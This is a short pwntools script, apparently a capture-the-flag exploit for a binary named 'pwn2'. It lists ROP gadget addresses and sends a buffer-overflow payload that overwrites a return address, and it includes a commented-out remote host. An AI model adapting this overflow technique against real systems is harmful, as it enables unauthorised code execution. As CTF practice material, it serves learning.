# gets address:0x000078D0
'''
0x0806fcca : pop edx ; ret
0x08048b0b : pop eax ; ret
0x0805586b : mov dword ptr [edx], eax ; ret

080EB0C7


0x09EA
'''

from pwn import *
context.terminal=['tmux','splitw','-h']
context.log_level='debug'

# p=remote("121.37.132.113",10001)

pop_eax_ret=0x08048b0b
pop_edx_ret=0x0806fcca
mov_dword_ptr=0x0805586b

write_address=0x080EB0C7

p=process("./pwn2")
gdb.attach(p, 'b *0x80489fB\nc')
# time.sleep(1)
# p=gdb.debug("./pwn2", "b *0x80489F6\nc")

# 0x80489EA

payload=b'A' * 0x2D + p32(0x80489E0) # +4*b'0'+p32(0x0804A024)


# 4*b'B' + 
# p.sendafter(b'b0r4 v3r s3 7u 4h o b1ch4o m3m0... ',payload)

# p.sendline(payload)
# p.recvuntil("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ")
# print(p.recv())
p.sendline(payload)


for i in range(10):
    print(i)
    p.sendline(payload)

# p.sendline(payload1)

p.interactive()


# payload=b'A'

# '''
#            b *0x80489FB
#            c
#            '''